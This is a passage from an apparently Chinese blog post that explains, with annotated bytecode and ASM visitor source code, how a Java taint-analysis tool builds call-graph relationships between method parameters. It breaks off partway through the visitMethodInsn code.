class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getValue</code> 部分的字节码，用空行分隔了上面四条语句的字节码，出现的字节码指令包括：<br>ldc 从常量池加载数据到操作数栈，astore 从栈顶弹出并存储到本地变量表，aload 从本地变量表加载数据到操作数栈，invokestatic 调用类方法（静态），invokevirtual 调用实例方法，return 从当前方法返回 void。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(java.lang.Integer)</span>;</span><br><span class="line">  descriptor: (Ljava/lang/Integer;)V</span><br><span class="line">  flags: ACC_PUBLIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=<span class="number">1</span>, locals=<span class="number">5</span>, args_size=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>: ldc           #<span class="number">5</span>                  <span class="comment">// String 100 入栈</span></span><br><span class="line">       <span class="number">2</span>: astore_2                          <span class="comment">// 出栈</span></span><br><span class="line"></span><br><span class="line">       <span class="number">3</span>: aload_2                           <span class="comment">// 入栈，invokestatic 的参数，执行完毕后结果入栈</span></span><br><span class="line">       <span class="number">4</span>: invokestatic  #<span class="number">6</span>                  <span class="comment">// Method java/lang/Integer.parseInt:(Ljava/lang/String;)I</span></span><br><span class="line">       <span class="number">7</span>: invokestatic  #<span class="number">7</span>                  <span class="comment">// Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span></span><br><span class="line">      <span class="number">10</span>: astore_3                          <span class="comment">// 出栈，存储执行结果</span></span><br><span class="line"></span><br><span class="line">      <span class="number">11</span>: aload_1                           <span class="comment">// 入栈，参数 number</span></span><br><span class="line">      <span class="number">12</span>: astore_3                          <span class="comment">// 出栈</span></span><br><span class="line"></span><br><span class="line">      <span class="number">13</span>: aload_3                           <span class="comment">// 入栈，invokevirtual 的参数</span></span><br><span class="line">      <span class="number">14</span>: invokevirtual #<span class="number">8</span>                  <span class="comment">// Method java/lang/Integer.toString:()Ljava/lang/String; 执行完毕后结果入栈</span></span><br><span class="line">      <span class="number">17</span>: astore        <span class="number">4</span>                   <span class="comment">// 出栈</span></span><br><span class="line">      <span class="number">19</span>: <span class="keyword">return</span>                            <span class="comment">// 返回 void</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">6</span>: <span class="number">0</span></span><br><span class="line">      line <span class="number">7</span>: <span class="number">3</span></span><br><span class="line">      line <span class="number">9</span>: <span class="number">11</span></span><br><span class="line">      line <span class="number">10</span>: <span class="number">13</span></span><br><span class="line">      line <span class="number">11</span>: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>在调用方法前，进行参数的入栈，即创建一个新的栈帧，执行完毕后继续执行下一条指令。实际上这部分的模拟不是很懂，要说汇编语言倒还会看，但是 Java 字节码也还没到那么底层，我的理解是调用函数就会创建一个栈帧，执行完毕后从系统栈弹出栈帧，那么返回结果存入上一个栈帧的操作数栈栈顶？回头等我搞明白了再补两张图…</p><h2 id="7-CallGraphDiscovery"><a href="#7-CallGraphDiscovery" class="headerlink" title="7. CallGraphDiscovery"></a>7. CallGraphDiscovery</h2><p><code>discover</code> 方法利用之前得到的类信息、方法信息、继承&#x2F;重写信息、数据流信息，结合 asm 访问者分析被调方法的参数是否会被调用者方法的参数所影响。</p><p>以下面 getValue 方法为例，调用了 parseInt 和 toString 两个方法，但是参数 number 只会影响到 toString。因此如果污点（攻击者的输入数据）走到 getValue 方法且参数 number 是可控的（即上一步分析能够传递污染），那么进一步只需要检查 toString 方法，而 parseInt 方法就不用再检查了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(Integer number)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(s);</span><br><span class="line">    </span><br><span class="line">    n = number;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> n.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法的具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用关系信息：方法所属类名，方法名，方法描述符，被调方法所属类名，被调方法名，被调方法描述符，方法参数索引，方法参数对象的字段名称，被调方法参数索引</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分析调用关系，即被调方法的参数是否会被（调用者）方法的参数所影响</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载类信息</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    <span class="comment">// 加载数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化决策者</span></span><br><span class="line">    <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> config.getSerializableDecider(methodMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 判断被调方法的参数是否会被调用者方法的参数所影响</span></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod -&gt; visitOuterClass -&gt; visitInnerClass -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> <span class="title class_">ModelGeneratorClassVisitor</span>(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                        ClassReader.EXPAND_FRAMES);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了五个访问者方法，主要关注 <code>visitMethod</code> 中调用 <code>ModelGeneratorMethodVisitor</code> 对方法进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ModelGeneratorClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ModelGeneratorClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                      InheritanceMap inheritanceMap,</span></span><br><span class="line"><span class="params">                                      Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span><br><span class="line"><span class="params">                                      SerializableDecider serializableDecider, <span class="type">int</span> api)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api); <span class="comment">// ASM API 版本</span></span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;            <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> String signature;       <span class="comment">// 签名</span></span><br><span class="line">    <span class="keyword">private</span> String superName;       <span class="comment">// 父类名</span></span><br><span class="line">    <span class="keyword">private</span> String[] interfaces;    <span class="comment">// 接口</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                      String superName, String[] interfaces)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="comment">// 记录类的相关信息</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.signature = signature;</span><br><span class="line">        <span class="built_in">this</span>.superName = superName;</span><br><span class="line">        <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                     String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用父类方法，返回新的方法观察者</span></span><br><span class="line">        <span class="comment">// 如果类观察者的 cv 变量为空，则返回 null，否则返回 cv.visitMethod</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建方法访问者，判断方法参数与被调用方法参数的传递关系</span></span><br><span class="line">        <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）:visitCode -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        <span class="type">ModelGeneratorMethodVisitor</span> <span class="variable">modelGeneratorMethodVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelGeneratorMethodVisitor</span>(classMap,</span><br><span class="line">                inheritanceMap, passthroughDataflow, serializableDecider, api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> &#123;   <span class="comment">// 访问类的外围类（如果有）</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="built_in">super</span>.visitOuterClass(owner, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="type">int</span> access)</span> &#123;  <span class="comment">// 访问内部类，该内部类不一定是被访问的类的成员</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="built_in">super</span>.visitInnerClass(name, outerName, innerName, access);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorMethodVisitor</code> 也继承了 <code>TaintTrackingMethodVisitor</code> 实现，不过只重写了其中的 3 个访问者方法</p><ul><li>visitCode：启动对方法代码的访问，把参数全部存到本地变量表</li><li>visitFieldInsn：访问字段指令，字段指令是加载或存储对象字段值的指令</li><li>visitMethodInsn：访问方法指令，方法指令是调用方法的指令</li></ul><p><code>visitCode</code> 和 PassthroughDataflowMethodVisitor（直接存储参数索引）中的实现类似，不同的是这里将 <code>arg</code> 与参数索引进行拼接，存储字符串到本地变量表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;   <span class="comment">// 启动对方法代码的访问</span></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitCode 初始化本地变量表</span></span><br><span class="line">    <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录参数到本地变量表 savedVariableState.localVars</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法，第一个参数（隐式）为对象实例 this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        <span class="comment">// 使用 arg 前缀来表示方法入参，后续用于判断是否为目标调用方法的入参</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历参数，根据描述符得出参数类型（占用空间大小）</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> 也和 PassthroughDataflowMethodVisitor（直接存储参数索引）中的实现类似，不同的是这里将字段名称与 <code>arg参数索引</code> 字符串进行拼接，然后存储到栈顶。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;    <span class="comment">// 访问字段指令，字段指令是加载或存储对象字段值的指令。</span></span><br><span class="line">    <span class="comment">// 方法执行过程中可能访问对象字段，访问前会进行入栈操作</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// 获取类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// 设置类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// 获取对象字段</span></span><br><span class="line">            <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// 字段类型</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 如果字段被 transient 关键字修饰，则不可序列化</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断读取的字段所属类是否可序列化，即字段是否可以序列化</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 若读取的字段所属类可序列化</span></span><br><span class="line">                    <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 遍历类的所有字段</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// 是否为目标字段</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// 是否被 transient 关键字修饰</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 若找不到目标字段，则向上查找（超类）</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">                Set&lt;String&gt; newTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                        newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);   <span class="comment">// 拼接名称</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">                <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.setStackTaint 将栈顶设置为 newTaint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// 设置对象字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> 方法分析被调方法的操作数栈，栈中的元素要么为空集合，要么为能够传递污染的参数集合，模拟操作数栈的元素个数，但元素值是集合（模拟值，不是真实&#x2F;实际值）。<br>最开始的时候已经将当前方法的参数以 <code>arg参数索引</code> 的形式存储到了本地变量表，当调用其他方法时，会从本地变量表加载数据到栈中，如果用到对象字段，则以 <code>arg参数索引.字段名称</code> 的形式入栈，因此根据栈中元素的名称就可以得知方法的哪些参数（根据名称判断）影响了被调方法的哪些参数（已知参数个数）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;  <span class="comment">// 访问方法指令，方法指令是调用方法的指令。</span></span><br><span class="line">    <span class="comment">// 获取被调用方法的参数和类型，非静态方法需要把实例类型放在第一个元素</span></span><br><span class="line">    <span class="comment">// 